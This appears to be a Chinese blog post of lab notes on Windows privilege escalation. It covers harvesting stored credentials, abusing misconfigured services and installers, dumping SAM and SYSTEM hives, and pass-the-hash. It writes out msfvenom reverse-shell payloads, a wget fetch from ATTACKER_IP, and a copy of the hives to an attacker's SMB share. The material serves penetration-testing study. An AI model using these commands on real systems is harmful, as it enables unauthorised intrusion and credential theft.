<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>win提权 | myift</title><meta name="author" content="dgh"><meta name="copyright" content="dgh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="win的提权从通常的位置收集密码远程连接纯命令行 xfreerdp xfreerdp &#x2F;v:&lt;远程IP&gt; &#x2F;u:&lt;用户名&gt; &#x2F;p:&lt;密码&gt;  界面 remmina Powershell历史每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去命令的内存。这对于快速重复您之前使用的命令非常有用。如果用户在 Powershell 命">
<meta property="og:type" content="article">
<meta property="og:title" content="win提权">
<meta property="og:url" content="http://example.com/2025/03/20/win%E6%8F%90%E6%9D%83/index.html">
<meta property="og:site_name" content="myift">
<meta property="og:description" content="win的提权从通常的位置收集密码远程连接纯命令行 xfreerdp xfreerdp &#x2F;v:&lt;远程IP&gt; &#x2F;u:&lt;用户名&gt; &#x2F;p:&lt;密码&gt;  界面 remmina Powershell历史每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去命令的内存。这对于快速重复您之前使用的命令非常有用。如果用户在 Powershell 命">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/image/png.png">
<meta property="article:published_time" content="2025-03-20T02:40:07.000Z">
<meta property="article:modified_time" content="2025-03-21T10:43:05.442Z">
<meta property="article:author" content="dgh">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/image/png.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "win提权",
  "url": "http://example.com/2025/03/20/win%E6%8F%90%E6%9D%83/",
  "image": "http://example.com/image/png.png",
  "datePublished": "2025-03-20T02:40:07.000Z",
  "dateModified": "2025-03-21T10:43:05.442Z",
  "author": [
    {
      "@type": "Person",
      "name": "dgh",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/03/20/win%E6%8F%90%E6%9D%83/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'win提权',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/png1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">myift</span></a><a class="nav-page-title" href="/"><span class="site-name">win提权</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">win提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-20T02:40:07.000Z" title="发表于 2025-03-20 10:40:07">2025-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-21T10:43:05.442Z" title="更新于 2025-03-21 18:43:05">2025-03-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="win的提权"><a href="#win的提权" class="headerlink" title="win的提权"></a>win的提权</h2><h3 id="从通常的位置收集密码"><a href="#从通常的位置收集密码" class="headerlink" title="从通常的位置收集密码"></a>从通常的位置收集密码</h3><h4 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h4><p>纯命令行</p>
<p>xfreerdp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:&lt;远程IP&gt; /u:&lt;用户名&gt; /p:&lt;密码&gt;</span><br></pre></td></tr></table></figure>

<p>界面</p>
<p>remmina</p>
<h4 id="Powershell历史"><a href="#Powershell历史" class="headerlink" title="Powershell历史"></a>Powershell历史</h4><p>每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去命令的内存。这对于快速重复您之前使用的命令非常有用。如果用户在 Powershell 命令行中直接运行包含密码的命令，则稍后可以从 <code>cmd.exe</code>提示符中使用以下命令检索该密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">%userprofile%</span><br><span class="line">这是 Windows 的环境变量，表示当前用户的主目录（Home 目录）。</span><br><span class="line">如果要在powershell执行命令我们要把%userprofile%换为$Env：userprofile</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20250310224125306.png" alt="image-20250310224125306"></p>
<h4 id="保存的-Windows-凭据"><a href="#保存的-Windows-凭据" class="headerlink" title="保存的 Windows 凭据"></a>保存的 Windows 凭据</h4><p>Windows 允许我们使用其他用户的凭据。此函数还提供了在系统上保存这些凭据的选项。以下命令将列出已保存的凭据：</p>
<p><code>cmdkey /list</code> 用于列出当前用户存储的凭据（如用户名和密码），这些凭据通常用于自动登录到远程计算机、网络共享或其他受身份验证保护的资源。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250310224150121.png" alt="image-20250310224150121"></p>
<p>如果您发现任何值得尝试的凭据，可以将它们与 <code>runas</code> 命令和 <code>/savecred</code> 选项一起使用，如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure>

<p>该命令用于以 <code>admin</code> 用户的身份运行 <code>cmd.exe</code>（命令提示符），并使用 <code>savecred</code> 选项存储密码，以后运行相同的命令时无需再次输入密码。</p>
<p>这里发现哪个用户有凭证就使用哪个用户</p>
<p>以下是在文件上查找数据库连接字符串的快速方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure>

<p>该命令用于在 <code>web.config</code> 配置文件中查找包含 <code>connectionString</code> 的行，通常用于查找数据库连接字符串。</p>
<h4 id="PuTTY"><a href="#PuTTY" class="headerlink" title="PuTTY"></a>PuTTY</h4><p>是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接的参数，而是可以存储会话，其中 IP、用户和其他配置可以存储以供以后使用。虽然 PuTTY 不允许用户存储他们的 SSH 密码，但它会存储包含明文身份验证凭据的代理配置</p>
<p>用于在注册表中查询 PuTTY 的会话配置，筛选出包含 “Proxy” 的项。这可以帮助您查看各个会话的代理设置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure>

<h3 id="其他快速获胜"><a href="#其他快速获胜" class="headerlink" title="其他快速获胜"></a>其他快速获胜</h3><h4 id="Scheduled-Tasks-计划任务"><a href="#Scheduled-Tasks-计划任务" class="headerlink" title="Scheduled Tasks 计划任务"></a>Scheduled Tasks 计划任务</h4><p>可以使用 <code>schtasks</code> 命令从命令行列出计划任务，不带任何选项。要检索有关任何服务的详细信息，您可以使用类似于以下的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /query /tn vulntask /fo list /v</span><br></pre></td></tr></table></figure>

<p>您将获得有关任务的大量信息，但对我们来说重要的是“Task to Run”参数，该参数指示计划任务执行的内容，以及“Run As User”参数，该参数显示将用于执行任务的用户。</p>
<p>如果我们的当前用户可以修改或覆盖 “Task to Run” 可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而产生简单的权限提升。要检查可执行文件的文件权限，我们使用 <code>icacls</code>：</p>
<h4 id="AlwaysInstallElevated-始终安装提升"><a href="#AlwaysInstallElevated-始终安装提升" class="headerlink" title="AlwaysInstallElevated 始终安装提升"></a>AlwaysInstallElevated 始终安装提升</h4><p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，这些可以配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能允许我们生成一个恶意的 MSI 文件，该文件将以管理员权限运行。</p>
<p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些内容。</p>
<p>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer </p>
<p>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</p>
<p>为了能够利用此漏洞，应同时设置两者。否则，将无法进行利用。如果设置了这些，您可以使用 <code>msfvenom</code> 生成恶意 .msi 文件，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></table></figure>



<p>由于这是一个反向 shell，因此您还应该运行相应配置的 Metasploit Handler 模块。传输已创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br></pre></td></tr></table></figure>

<p>该命令使用 <strong>Windows Installer (<code>msiexec</code>)</strong> 在 <strong>静默模式</strong> 下安装指定的 MSI 软件包 (<code>malicious.msi</code>)。</p>
<h3 id="Abusing-Service-Misconfigurations滥用服务配置错误"><a href="#Abusing-Service-Misconfigurations滥用服务配置错误" class="headerlink" title="Abusing Service Misconfigurations滥用服务配置错误"></a>Abusing Service Misconfigurations滥用服务配置错误</h3><h4 id="对服务可执行文件的不安全权限"><a href="#对服务可执行文件的不安全权限" class="headerlink" title="对服务可执行文件的不安全权限"></a>对服务可执行文件的不安全权限</h4><p>Windows 服务由<strong>服务控制管理器</strong> （SCM） 管理。SCM 是一个过程，负责根据需要管理服务的状态，检查任何给定服务的当前状态，并通常提供一种配置服务的方法。</p>
<p>Windows 计算机上的每个服务都有一个关联的可执行文件，每当服务启动时，该可执行文件将由 SCM 运行。请务必注意，服务可执行文件实现特殊功能以便能够与 SCM 通信，因此无法将任何可执行文件作为服务成功启动。每个服务还指定运行服务的用户帐户。</p>
<p>这个可以理解为我们可以对一个服务的执行文件有一个权限可以进行移动改名什么的然后我们将我们构造的恶意文件去替换服务关联的可执行文件</p>
<p>首先，我们将使用 <code>sc</code> 查询服务配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc qc apphostsvc</span><br></pre></td></tr></table></figure>



<p><img src="/../imgs/$%7Bfiilename%7D/image-20250313211322520.png" alt="image-20250313211322520"></p>
<p><strong>BINARY_PATH_NAME</strong> 参数指定关联的可执行文件</p>
<p>用于运行服务的帐户显示在 <strong>SERVICE_START_NAME</strong> 参数上</p>
<p>比如我们查询到</p>
<p>文件位置后使用 msfvenom 生成一个 exe-service 有效负载，并通过 python Web 服务器提供它</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>

<p>然后在目标靶机上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe</span><br></pre></td></tr></table></figure>



<p>然后进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; cd C:\PROGRA~2\SYSTEM~1\</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></table></figure>

<p>然后在我们攻击机上起一个监听即可</p>
<p>然后只要服务重启我们就可以</p>
<p>得到shell了</p>
<h4 id="未加引号的服务路径"><a href="#未加引号的服务路径" class="headerlink" title="未加引号的服务路径"></a>未加引号的服务路径</h4><p>使用 Windows 服务时，当服务配置为指向“未加引号的”可执行文件时，会发生非常特殊的行为</p>
<p>例如:</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250313211424055.png" alt="image-20250313211424055"></p>
<p>当 SCM 尝试执行关联的二进制文件时，会出现问题。由于 “Disk Sorter Enterprise” 文件夹的名称上有空格，因此命令变得不明确，并且 SCM 不知道您尝试执行以下哪项作</p>
<p>首先，搜索 <code>C：\\MyPrograms\\Disk.exe</code>。如果存在，则服务将运行此可执行文件。</p>
<p>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter.exe</code> 。如果存在，则服务将运行此可执行文件。</p>
<p>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code> 。此选项预期会成功，并且通常会在默认安装中运行。</p>
<p>所以我们可以创建一个恶意文件顶替关联文件利用机制让其执行我们的恶意文件比如我们创建一个C：\MyPrograms\Disk.exe</p>
<p>或者是C:\MyPrograms\Disk Sorter.exe</p>
<p>虽然默认情况下，大多数服务可执行文件将安装在 <code>C：\Program Files</code> 或 <code>C：\Program Files （x86）</code> 下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则也有例外： - 某些安装程序更改了已安装文件夹的权限，使服务容易受到攻击。- </p>
<p>管理员可能决定在非默认路径中安装服务二进制文件。如果这样的路径是全局可写的，则可以利用此漏洞。</p>
<p>icacls可用来检查权限</p>
<p>例:</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250313212200593.png" alt="image-20250313212200593"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250313212236780.png" alt="image-20250313212236780"></p>
<p>使用 msfvenom 创建 exe-service 负载并将其传输到目标主机的过程与以前相同，因此请随意创建以下负载并像以前一样将其上传到服务器。我们还将启动一个侦听器，以便在执行时接收反向 shell：</p>
<p>有效负载进入服务器后，将其移动到可能发生劫持的任何位置。在本例中，我们会将有效负载移动到 <code>C：\MyPrograms\Disk.exe</code>。我们还将授予 Everyone 对该文件的完全权限，以确保服务可以执行该文件：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250313215705636.png" alt="image-20250313215705636"></p>
<h4 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h4><p>如果服务的可执行 DACL 配置正确，并且服务的二进制路径被正确引用，则您可能仍有很小的机会利用该服务。如果服务 DACL（而不是服务的可执行 DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向您需要的任何可执行文件，并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p>
<p>要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a>。为方便起见，C<code>：\\tools</code> 中提供了一份副本。检查 thmservice 服务 DACL 的命令为：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250313220059481.png" alt="image-20250313220059481"></p>
<p>这里我们可以看到 <code>BUILTIN\\Users</code> 组具有 SERVICE_ALL_ACCESS 权限，这意味着任何用户都可以重新配置服务。</p>
<p>在更改服务之前，让我们构建另一个 exe-service 反向 shell，并在攻击者的机器上为它启动一个监听器：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250313220115972.png" alt="image-20250313220115972"></p>
<p>然后，我们会将反向 shell 可执行文件传输到目标计算机并将其存储在 <code>C:\Users\thm-unpriv\rev-svc3.exe</code> 中。随意使用 wget 传输可执行文件并将其移动到所需位置。请记住向 Everyone 授予执行有效负载的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</span><br></pre></td></tr></table></figure>



<p>要更改服务的关联可执行文件和帐户，我们可以使用以下命令（使用 sc.exe 时请注意等号后的空格）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem</span><br></pre></td></tr></table></figure>

<h3 id="Abusing-dangerous-privileges滥用危险权限"><a href="#Abusing-dangerous-privileges滥用危险权限" class="headerlink" title="Abusing dangerous privileges滥用危险权限"></a>Abusing dangerous privileges滥用危险权限</h3><p>权限是帐户执行特定系统相关任务时必须拥有的权限。这些任务可以像关闭计算机的权限一样简单，也可以绕过某些基于 DACL 的访问控制的权限。</p>
<p>每个用户都有一组分配的权限，可以使用以下命令检查这些权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">此处</a>提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的权限才有意义。您可以在 <a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a> Github 项目上找到可利用权限的完整列表。</p>
<p>展示如何滥用您能找到的一些最常见的特权。</p>
<h4 id="SeBackup-SeRestore"><a href="#SeBackup-SeRestore" class="headerlink" title="SeBackup &#x2F; SeRestore"></a>SeBackup &#x2F; SeRestore</h4><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何现有的 DACL。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。</p>
<p>拥有此权限，攻击者可以使用多种技术轻松提升系统的权限。我们将查看的配置包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希。</p>
<p>此帐户是“Backup Operators”组的一部分，默认情况下，该组被授予 SeBackup 和 SeRestore 权限。我们需要使用 “Open as administrator（以管理员身份打开）”选项打开命令提示符以使用这些权限。系统将要求我们再次输入密码以获取提升的控制台：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250317185406640.png" alt="image-20250317185406640"></p>
<p>shell弹出来后进行一个简单的提权</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250317185518767.png" alt="image-20250317185518767"></p>
<p>首先备份一个</p>
<p><strong><code>hklm\system</code></strong></p>
<ul>
<li>备份 <code>HKEY_LOCAL_MACHINE\SYSTEM</code>，其中包含系统配置、驱动程序信息等关键数据。</li>
<li>该 Hive 可用于提取 <strong>系统启动信息、LSA Secrets、SAM 账户解密密钥</strong> 等。</li>
</ul>
<p><strong><code>hklm\sam</code></strong></p>
<ul>
<li>备份 <code>HKEY_LOCAL_MACHINE\SAM</code>，它存储 Windows 本地账户信息。</li>
<li>该 Hive 可用于提取 <strong>用户哈希密码（NTLM Hash）</strong>。</li>
</ul>
<p><strong>获取 Windows 本地账户的 NTLM Hash</strong></p>
<ul>
<li><p><code>HKLM\SAM</code> 存储用户凭据，但它是加密的。</p>
</li>
<li><p><code>HKLM\SYSTEM</code> 里存有解密密钥，可用来解密 <code>SAM</code> 中的 NTLM Hash。</p>
<p>然后使用一些方法将其copy到你的攻击机上</p>
<p>下面我们演示用smb服务来将文件传到攻击机上</p>
<p>你的命令在攻击者机器  上使用 <strong>Impacket</strong> 提供了一个 SMB 共享服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share</span><br></pre></td></tr></table></figure>

<p>这将创建一个名为 <code>public</code> 的共享，指向<code>共享</code>目录，这需要我们当前 Windows 会话的用户名和密码。在此之后，我们可以使用 Windows 机器中的 <code>copy</code> 命令将两个文件传输到我们的 攻击机</p>
</li>
</ul>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250317185803701.png" alt="image-20250317185803701"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\</span><br><span class="line">C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\</span><br></pre></td></tr></table></figure>

<p>使用 impacket 检索用户的密码哈希值：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250317190128805.png" alt="image-20250317190128805"></p>
<p>然后就可以使用Administrator 的哈希来执行 Pass-the-Hash 攻击，并以 SYSTEM 权限访问目标计算机：</p>
<h5 id="补充Pass-the-Hash-Pass-The-Ticket"><a href="#补充Pass-the-Hash-Pass-The-Ticket" class="headerlink" title="补充Pass-the-Hash,Pass The Ticket"></a>补充Pass-the-Hash,Pass The Ticket</h5><p>这里对 Pass-the-Hash 进行一个扩展补充</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。 攻击者无须通过解密hash值来获取明文密码。因为对于每个Session hash值都是固定的，除非密码被修改了(需要刷新缓存才能生效)，所以pth可以利用身份验证协议来进行攻击。 攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。</span><br><span class="line"></span><br><span class="line">虽然哈希传递攻击可以在Linux,Unix和其他平台上发生,但它们在windows系统上最普遍。 在Windows中，pth通过NT Lan Manager(NTLM)，Kereros和其他身份验证协议来进行单点登录。在Windows中创建密码后，密码经过哈希化处理后存储在安全账户管理器(SAM)，本地安全机构子系统(LSASS)进程内存，凭据管理器(CredMan),Active Directory中的ntds.dit数据库或者其他地方。因此，当用户登录windows工作站或服务器时，他们实际上会留下密码凭据(hash)。</span><br></pre></td></tr></table></figure>

<p>Pass The Ticket</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">票据传递攻击（Pass The Ticket，PTT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PTH基于 NTLM 认证进行攻击，而 PTT 基于 Kerberos 协议进行攻击票据传递攻击，目的是伪造、窃取凭据提升权限。</span><br><span class="line">常用的攻击方式：MS14-068、黄金票据、白银票据等。</span><br></pre></td></tr></table></figure>

<p>PAC<br>微软在Windows平台上对Kerberos协议进行了一些扩充，其中最重要的扩充就是增加了认证过程中的权限认证，也就是在协议中增加了PAC（Privilege Attribute Certificate），特权属性证书。</p>
<p>在一个域中，通过 User 的 SID 和所在组 Group 的 SID 来确定该用户所拥有的权限。所以 PAC 包含 Client 的 User 的 SID、Group 的 SID。PAC 为了保证自身的合法性，还包含 2 个签名。</p>
<p>（1）Client 向 AS 请求认证，验证完Client的身份后，AS 在返回 TGT 时，生成 PAC，以及用于确保 PAC 不被篡改的两个签名，一个签名的密钥为 KDC用户（krbtgt） 的 NTLM Hash，另一个签名的密钥为 Server 的 NTLM Hash，而签名的内容主要为 User SID、Group SID </p>
<p><img src="/../imgs/$%7Bfiilename%7D/56260b9c801216db85604fc05602c7b0.png" alt="img"></p>
<p>Client向 TGS 发送请求，来获取访问 Server的Ticket 。TGS 对TGS Request 中的 TGT 解密，并通过两个签名来验证 PAC 的合法性。若验证通过，TGS 会重新生成两个新的签名保证 PAC 不被篡改。第一个签名的密钥为 Server 的 NTLM Hash，第二个密钥为 Server 与 Client 的临时会话密钥 Session Key（Server-Client）。新的 PAC 会被放置在签发的访问票据 Ticket 中，使用 Server 的 NTLM Hash进行加密。<br><img src="/../imgs/$%7Bfiilename%7D/bbc787a1a68f2a6f15fdbd9e65eee5e1.png" alt="img"></p>
<p>Client 使用 Ticket 向 Server 请求相应的资源， Server收到请求，将 Ticket 解密并验证，校验 PAC 中的两个签名，验证 PAC 的合法性，之后根据 PAC 得知Client的权限，让其访问对应资源。</p>
